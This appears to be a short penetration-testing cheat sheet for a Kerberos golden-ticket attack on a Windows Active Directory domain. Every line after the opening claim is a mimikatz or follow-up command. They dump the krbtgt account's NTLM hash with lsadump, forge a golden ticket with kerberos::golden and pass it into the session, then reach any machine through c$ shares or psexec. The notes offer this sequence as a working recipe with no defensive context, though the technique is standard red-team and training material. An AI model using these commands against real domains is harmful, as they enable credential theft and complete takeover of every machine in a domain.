if you have the krbtgt, you have complete access to every machine in the domain
 
Tools:  
mimikatz
 
### .\mimikatz.exe

### privilege::debug

### lsadump::lsa /inject /name:krbtgt
 
Grab the Domain SID, NTLM hash of krbtgt account
 
### kerberos::golden /User:AnyUser /domain:<domain.local> /sid:<SID> /krbtgt:<krbtgt_NTLM_hash> /id:500 /ptt
 
### misc::cmd
 
### dir [\\<any_domain>\c$](file:///\\<any_domain>\c$)

OR

### psexec.exe [\\<domain>](file:///\\<domain>) cmd